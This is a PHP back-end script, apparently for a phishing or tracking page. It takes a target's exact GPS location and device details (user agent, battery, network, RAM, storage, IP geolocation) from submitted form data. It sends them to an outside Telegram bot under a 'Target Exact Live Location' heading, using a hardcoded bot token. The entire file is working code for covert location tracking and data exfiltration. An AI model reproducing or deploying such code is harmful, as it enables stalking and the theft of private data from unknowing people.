<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Retrieve POST data
    $latitude = $_POST['latitude'];
    $longitude = $_POST['longitude'];
    $chatid = $_POST['chatid'];
    $userAgent = $_POST['userAgent'];
    $date = $_POST['date'];
    $timezone = $_POST['timezone'];
    $batteryPercentage = $_POST['batteryPercentage'];
    $chargingStatus = $_POST['chargingStatus'];
    $networkType = $_POST['networkType'];
    $downlinkSpeed = $_POST['downlinkSpeed'];
    $selectedNumber = $_POST['selectedNumber'];
    $countryCode = $_POST['countryCode'];
    $permission = $_POST['permission'];

    // Get IP address and location details
    $ip = file_get_contents('https://ipinfo.io/ip');
    $url = "http://ip-api.com/json/$ip";
    $json = file_get_contents($url);
    $data = json_decode($json, true);
    $city = isset($data['city']) ? $data['city'] : 'Unknown'; 
    $country = isset($data['country']) ? $data['country'] : 'Unknown';
    $org = isset($data['org']) ? $data['org'] : 'Unknown';

    // Prepare the message
    $message = "
    ╭┈┈┈┈┈┈┈┈┈┈┈┈┈╮
  ⚡Powered by :- @Kaliboy002
╰┈┈┈┈┈┈┈┈┈┈┈┈┈╯
 
<b>🌐 IP Address:</b> $ip
<b>💻 User-Agent:</b> $userAgent
<b>🔋 Battery Percentage:</b> $batteryPercentage% 
<b>⚡ Charging Status:</b> $chargingStatus
<b>🗣️ Browser Language:</b> " . substr($_SERVER['HTTP_ACCEPT_LANGUAGE'], 0, 2) . "
<b>📏 Screen Size:</b> " . (isset($_POST['screenSize']) ? $_POST['screenSize'] : 'Unknown') . "
<b>🚀 Internet Speed:</b> $downlinkSpeed Mbps
<b>🌍 Network Type:</b> $networkType
<b>✅ Mobile Data:</b> " . (strpos($networkType, 'mobile') !== false ? 'Yes' : 'No') . "
<b>🧠 Total RAM:</b> " . (isset($_POST['totalRAM']) ? $_POST['totalRAM'] : 'Unknown') . "
<b>💾 Device Storage:</b> " . (isset($_POST['deviceStorage']) ? $_POST['deviceStorage'] : 'Unknown') . "
<b>🕒 Date:</b> $date
<b>🗺 Target Exact Live Location 👇</b>";

    // Telegram Bot Token and Chat ID
    $token = "8090590898:AAF1uFEwi_o64gyeauGBgh9i0pFQMUeWl0w"; // Replace with your actual token

    // URL encode the message
    $encoded_message = urlencode($message);

    // Send message to Telegram
    $send_message = "https://api.telegram.org/bot$token/sendMessage?chat_id=$chatid&text=$encoded_message&parse_mode=HTML";
    file_get_contents($send_message);

    // Send location to Telegram
    $send_location = "https://api.telegram.org/bot$token/sendLocation?chat_id=$chatid&latitude=$latitude&longitude=$longitude";
    file_get_contents($send_location);

    // Return response to the client
    echo $message; // Send the formatted message back to the client
} else {
    // Handle invalid request method
    echo "Invalid request method.";
}
?>